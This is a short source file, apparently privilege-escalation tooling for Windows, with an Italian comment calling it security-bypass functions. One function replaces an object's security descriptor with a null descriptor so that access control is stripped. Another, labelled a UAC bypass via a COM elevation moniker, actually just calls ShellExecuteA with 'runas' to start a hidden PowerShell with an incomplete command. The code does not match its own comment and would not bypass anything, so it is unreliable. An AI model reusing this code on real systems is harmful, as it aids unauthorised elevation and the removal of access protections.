// Funzioni per bypass sicurezza
struct SecurityContext {
    ptr original_sd;
    ptr modified_sd;
    u32 type;
}

fn bypass_security_descriptor(ptr object_path, u32 type) -> SecurityContext {
    let ctx = SecurityContext {
        original_sd: get_security_descriptor(object_path),
        modified_sd: create_null_security_descriptor(),
        type: type
    };
    
    // Bypass security
    let status = NtSetSecurityObject(
        object_path,
        type,  // SecurityInformation
        ctx.modified_sd
    );
    
    if status != 0 {
        free(ctx.original_sd);
        free(ctx.modified_sd);
        ret null;
    }
    
    ret ctx;
}

fn restore_security(SecurityContext ctx, ptr object_path) -> bool {
    let status = NtSetSecurityObject(
        object_path,
        ctx.type,
        ctx.original_sd
    );
    
    free(ctx.original_sd);
    free(ctx.modified_sd);
    
    ret status == 0;
}

fn bypass_uac() -> bool {
    // Bypass UAC using COM elevation moniker
    let cmd = "cmd.exe /c start powershell.exe -WindowStyle Hidden -Command ";
    let payload = alloc(1024);
    sprintf(payload, "%s%s", cmd, "Start-Process -Verb RunAs");
    
    let result = ShellExecuteA(
        null,
        "runas",
        payload,
        null,
        null,
        0  // SW_HIDE
    );
    
    free(payload);
    ret result > 32;
}